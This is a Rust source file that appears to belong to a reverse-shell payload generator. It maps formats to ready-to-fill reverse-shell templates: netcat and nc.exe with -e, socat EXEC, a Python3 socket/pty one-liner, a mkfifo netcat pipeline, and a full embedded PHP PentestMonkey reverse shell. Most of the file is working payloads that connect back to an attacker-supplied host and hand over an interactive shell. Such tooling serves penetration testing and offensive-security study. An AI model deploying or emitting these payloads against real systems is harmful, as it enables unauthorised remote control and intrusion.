pub struct Template {
    pub name: &'static str,
    pub description: &'static str,
    pub template: &'static str,
}

use super::Format;

pub fn get_template(format: &Format) -> Template {
    match format {
        Format::Netcat => Template {
            name: "Netcat",
            description: "Basic TCP connection using netcat (You're better than this!!!)",
            template: "nc <CONNECT_BACK_HOST> <CONNECT_BACK_PORT> -e <SHELL>",
        },
        Format::NetcatExe => Template {
            name: "Netcat.exe",
            description: "Basic TCP connection using netcat(nc.exe), for Windows (You're better than this!!!)",
            template: "nc.exe <CONNECT_BACK_HOST> <CONNECT_BACK_PORT> -e <SHELL>",
        },
        Format::Socat => Template {
            name: "Socat",
            description: "TCP connection using socat",
            template: "socat TCP:<CONNECT_BACK_HOST>:<CONNECT_BACK_PORT> EXEC:'<SHELL>',pty,stderr,setsid,sigint,sane",
        },
        Format::Powershell => Template {
            name: "PowerShell",
            description: "Windows PowerShell connection",
            template: "<CONNECT_BACK_HOST>:<CONNECT_BACK_PORT> using <SHELL>",
        },
        Format::Python3 => Template {
            name: "Python3",
            description: "Python3 TCP Reverse Shell",
            template: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<CONNECT_BACK_HOST>\",<CONNECT_BACK_PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"<SHELL>\")'",
        },
        Format::Mkfifo => Template {
            name: "Mkfifo",
            description: "Mkfifo Netcat TCP Reverse Shell (Requires Netcat)",
            template: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|<SHELL> -i 2>&1|nc <CONNECT_BACK_HOST> <CONNECT_BACK_PORT> >/tmp/f",
        },
        Format::PhpPentestmonkey => Template {
            name: "PHP Reverse Shell",
            description: "PHP PentestMonkey Reverse Shell",
            template: "
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. 
// RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = \"1.0\";
$ip = '<CONNECT_BACK_HOST>';
$port = <CONNECT_BACK_PORT>;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; <SHELL> -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();
    
    if ($pid == -1) {
        printit(\"ERROR: Can't fork\");
        exit(1);
    }
    
    if ($pid) {
        exit(0);  // Parent exits
    }
    if (posix_setsid() == -1) {
        printit(\"Error: Can't setsid()\");
        exit(1);
    }

    $daemon = 1;
} else {
    printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");
}

chdir(\"/\");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    printit(\"$errstr ($errno)\");
    exit(1);
}

$descriptorspec = array(
0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from
1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to
2 => array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
    printit(\"ERROR: Can't spawn shell\");
    exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit(\"Successfully opened reverse shell to $ip:$port\");

while (1) {
    if (feof($sock)) {
        printit(\"ERROR: Shell connection terminated\");
        break;
    }

    if (feof($pipes[1])) {
        printit(\"ERROR: Shell process terminated\");
        break;
    }

    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    if (in_array($sock, $read_a)) {
        if ($debug) printit(\"SOCK READ\");
        $input = fread($sock, $chunk_size);
        if ($debug) printit(\"SOCK: $input\");
        fwrite($pipes[0], $input);
    }

    if (in_array($pipes[1], $read_a)) {
        if ($debug) printit(\"STDOUT READ\");
        $input = fread($pipes[1], $chunk_size);
        if ($debug) printit(\"STDOUT: $input\");
        fwrite($sock, $input);
    }

    if (in_array($pipes[2], $read_a)) {
        if ($debug) printit(\"STDERR READ\");
        $input = fread($pipes[2], $chunk_size);
        if ($debug) printit(\"STDERR: $input\");
        fwrite($sock, $input);
    }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
    if (!$daemon) {
        print \"$string\n\";
    }
}

?>",
        },

    }
}